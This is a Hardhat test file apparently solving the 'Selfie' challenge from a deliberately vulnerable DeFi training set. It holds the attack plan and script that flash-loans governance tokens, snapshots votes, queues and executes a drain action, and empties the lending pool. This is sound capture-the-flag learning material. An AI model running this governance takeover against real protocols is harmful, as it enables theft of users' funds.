const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address    
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE
        We want tokens all from pool not goverment and we not have any DVT token to pass enough vote
        Goal at a drainAllFunds() which can execute only goverment but in goverment
        we need to do QueueAction and ExecuteAction pass.
        Step1: flashloan to take all tokens in pool and fallback to "receiveTokens(address,uint256)"
        Step2: Snapshot balance because before can queueAction,
        require _hasEnoughVotes(msg.sender) that come from balance in snapshot > half of total supply
        Step3: QueueAction
        Step4: ExecuteAction after time pass 2 days
        */
       
        // Deploy exploit contract.
    const ExploitFactory = await ethers.getContractFactory('SelfieExploit', attacker);
    const exploit = await ExploitFactory.deploy(this.governance.address, this.pool.address);
    console.log("Before attack");
    console.log("Pool balance:" + (ethers.utils.formatEther(await this.token.balanceOf(this.pool.address))).toString());
    console.log("Attacker balance:" + (ethers.utils.formatEther(await this.token.balanceOf(attacker.address))).toString());
   
    // 1. Flash loan enough governance tokens to queue drain action.
    await exploit.takeoverGov(TOKENS_IN_POOL);

    // Simulate waiting for the action delay to pass.
    const twoDays = 2 * 24 * 60 * 60;
    await ethers.provider.send("evm_increaseTime", [twoDays]); // 2 days

    // 2. After waiting for the action delay to have passed, execute it.
    await exploit.drainToAttacker();
    console.log("After attack");
    console.log("Pool balance:" + (ethers.utils.formatEther(await this.token.balanceOf(this.pool.address))).toString());
    console.log("Attacker balance:" + (ethers.utils.formatEther(await this.token.balanceOf(attacker.address))).toString());

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
